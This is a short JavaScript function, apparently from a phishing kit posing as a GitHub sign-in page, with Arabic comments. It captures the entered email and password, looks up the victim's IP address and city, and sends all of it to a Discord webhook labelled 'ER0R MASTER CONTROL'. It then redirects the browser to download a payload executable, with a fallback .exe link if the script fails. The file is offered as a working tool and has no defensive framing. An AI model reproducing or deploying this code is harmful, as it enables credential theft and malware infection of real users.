async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) {
        alert("يرجى إكمال بيانات التوثيق");
        return;
    }

    try {
        // قراءة الويب هوك من الملف
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // جلب معلومات الـ IP
        const geoRes = await fetch('https://ipapi.co/json/');
        const geo = await geoRes.json();

        // إرسال التقرير لديسكورد
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R MASTER CONTROL",
                embeds: [{
                    title: "💀 تم سحب هدف جديد - GitHub",
                    color: 0x6001d2,
                    fields: [
                        { name: "📧 الحساب", value: `\`${email}\``, inline: true },
                        { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true },
                        { name: "🌐 الـ IP", value: `${geo.ip} (${geo.city})`, inline: false }
                    ],
                    footer: { text: "ER0R TEAM - COMMAND CENTER" }
                }]
            })
        });

        // التحويل لتحميل ملف التحكم (الفرمتة)
        window.location.href = config.pc_payload; 
    } catch(e) {
        console.log("System Sync...");
        // في حال فشل السكربت، يتم التحويل إجبارياً
        window.location.href = "https://example.com/update.exe";
    }
}
